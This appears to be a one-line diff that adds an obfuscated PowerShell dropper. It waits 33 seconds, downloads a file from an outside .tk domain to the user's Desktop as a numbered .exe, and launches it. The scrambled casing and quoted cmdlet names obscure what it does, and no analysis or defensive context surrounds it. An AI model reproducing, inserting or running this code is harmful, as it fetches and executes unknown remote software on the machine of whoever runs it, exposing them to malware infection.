@@ -1,0 +1,1 @@
+$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDERpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('https://freeflysky.tk/rens','$Des\4447137.exe');&'Start-Process' $Des\4447137.exe
